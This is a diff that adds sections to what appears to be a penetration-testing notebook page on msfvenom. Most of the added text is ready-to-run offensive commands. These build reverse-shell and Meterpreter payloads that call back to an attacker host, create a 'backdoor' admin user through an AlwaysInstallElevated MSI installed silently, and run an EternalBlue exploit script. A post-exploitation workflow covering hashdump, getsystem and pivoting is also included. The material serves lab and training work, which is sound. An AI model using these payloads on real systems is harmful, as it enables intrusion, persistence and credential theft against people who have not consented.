@@ -9,6 +9,126 @@ hideFooterPagination: true
 
 {/* Generated from Commands/msfvenom.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## msfvenom: choose the operation and read the result
+
+Generate a payload matching the target and listener.
+
+### What the result establishes
+
+Match payload platform, architecture, staged/stageless choice, output format and handler configuration.
+
+### Prerequisites and common failures
+
+LHOST must be reachable from the target. Producing a file does not prove it runs on the target or matches the receiving handler.
+
+### Example 1: Commands
+
+Run in: **Kali**. These are raw stageless shells: listen on Kali with sudo nc -lvnp 443. Meterpreter payloads need a matching Metasploit handler instead.
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o shell.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o shell.elf
+```
+
+### Example 2: Common MSFvenom Commands
+
+Run in: **Saved lab example**.
+
+```bash
+# Linux reverse shell (stageless, ELF binary)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf
+
+# Windows reverse shell (stageless, EXE)
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe
+
+# Windows Meterpreter (staged)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > meterp.exe
+
+# List all payloads
+msfvenom -l payloads
+
+# List formats
+msfvenom --list formats
+```
+
+Saved context: [Shells, Payloads, and Interactive TTYs — Common MSFvenom Commands](/exploitation/shells-payloads-cheat-sheet#common-msfvenom-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Payloads — staged vs stageless
+
+Run in: **Saved lab example**.
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
+```
+
+Saved context: [Getting Started with Penetration Testing — Payloads — staged vs stageless](/getting-started/getting-started-cheat-sheet#payloads-—-staged-vs-stageless). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: AlwaysInstallElevated
+
+Run in: **Saved lab example**.
+
+```powershell
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
+msiexec /quiet /qn /i C:\evil.msi
+```
+
+Saved context: [Windows Privilege Escalation: Full Checklist — AlwaysInstallElevated](/privesc/windows-privesc-checklist#alwaysinstallelevated). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: MS17-010 (Eternal Blue)
+
+Run in: **Saved lab example**.
+
+```powershell
+git clone https://github.com/helviojunior/MS17-010
+
+# generate a simple reverse shell to use
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
+python2 send_and_execute.py 10.0.0.1 revshell.exe
+```
+
+Saved context: [Windows Privilege Escalation: Full Checklist — MS17-010 (Eternal Blue)](/privesc/windows-privesc-checklist#ms17-010-eternal-blue). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: msfvenom — generate standalone payloads
+
+Run in: **Saved lab example**.
+
+```bash
+# Linux ELF reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
+
+# Windows EXE meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
+
+# PHP web shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shell.php
+
+# List formats / payloads
+msfvenom --list formats
+msfvenom --list payloads | grep windows
+```
+
+Saved context: [Metasploit Framework: Startup to Sessions — msfvenom — generate standalone payloads](/exploitation/metasploit-framework-cheat-sheet#msfvenom-—-generate-standalone-payloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Mental model
+
+Run in: **Saved lab example**.
+
+```text
+Have a vuln + MSF module?  → search → use → set RHOSTS/LHOST/PAYLOAD → run
+No module, but can run a file? → msfvenom payload → multi/handler to catch it
+Got a session?  → sessions -i, background, sessions -u (upgrade to meterpreter)
+In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
+Need the internal net? → autoroute + socks_proxy → proxychains everything else
+Always: LHOST = your tun0, payload in venom must match the handler
+```
+
+Saved context: [Metasploit Framework: Startup to Sessions — Mental model](/exploitation/metasploit-framework-cheat-sheet#mental-model). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Generate a payload matching the target and listener.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=msfvenom) · [All tools](/index)
@@ -42,6 +162,13 @@ These are raw stageless shells: listen on Kali with sudo nc -lvnp 443. Meterpret
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Getting Started with Penetration Testing — Payloads — staged vs stageless](/getting-started/getting-started-cheat-sheet#payloads-—-staged-vs-stageless)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Mental model">
@@ -58,6 +185,13 @@ In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
 Need the internal net? → autoroute + socks_proxy → proxychains everything else
 Always: LHOST = your tun0, payload in venom must match the handler
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Mental model](/exploitation/metasploit-framework-cheat-sheet#mental-model)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -81,6 +215,13 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shell.ph
 msfvenom --list formats
 msfvenom --list payloads | grep windows
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — msfvenom — generate standalone payloads](/exploitation/metasploit-framework-cheat-sheet#msfvenom-—-generate-standalone-payloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -107,6 +248,13 @@ msfvenom -l payloads
 msfvenom --list formats
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Common MSFvenom Commands](/exploitation/shells-payloads-cheat-sheet#common-msfvenom-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="AlwaysInstallElevated">
@@ -120,6 +268,13 @@ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
 msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
 msiexec /quiet /qn /i C:\evil.msi
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — AlwaysInstallElevated](/privesc/windows-privesc-checklist#alwaysinstallelevated)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -143,6 +298,13 @@ Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (Alway
 python ms08-067.py 10.0.0.1 6 445
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS08-067 (NetAPI)](/privesc/windows-privesc-checklist#ms08-067-netapi)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="MS17-010 (Eternal Blue)">
@@ -159,6 +321,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=threa
 python2 send_and_execute.py 10.0.0.1 revshell.exe
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS17-010 (Eternal Blue)](/privesc/windows-privesc-checklist#ms17-010-eternal-blue)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="🧾 QUICK REFERENCE — &quot;I see X → do Y&quot;">
@@ -172,6 +341,13 @@ Context from the notebook: AlwaysInstallElevated = 1 (both) msfvenom -f msi  →
 ```text
 msfvenom -f msi
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 🧾 QUICK REFERENCE — "I see X → do Y"](/cheatsheets/windows-post-exploitation#-quick-reference-—-i-see-x-→-do-y)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -191,6 +367,21 @@ Payload size: 510 bytes
 Final size of dll file: 8704 bytes
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Generating a DLL Payload](/active-directory/historical-vulnerability-labs#generating-a-dll-payload)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
